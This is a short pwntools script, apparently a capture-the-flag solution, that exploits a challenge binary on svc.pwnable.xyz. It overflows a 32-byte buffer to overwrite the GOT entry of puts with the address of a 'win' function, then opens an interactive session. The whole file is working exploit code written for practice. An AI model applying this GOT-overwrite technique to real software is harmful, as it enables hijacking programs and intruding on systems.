from pwn import *

elf = ELF("./challenge")
io = remote("svc.pwnable.xyz", 30016)

io.sendlineafter(b'> ', b'1')
io.sendlineafter(b'? ', b'100')
io.sendlineafter(b': ', b'a'*32 + p64(elf.got['puts']))

io.sendlineafter(b'> ', b'2')
io.sendlineafter(b': ', p64(elf.sym['win']))

io.sendline(b'3')
io.interactive()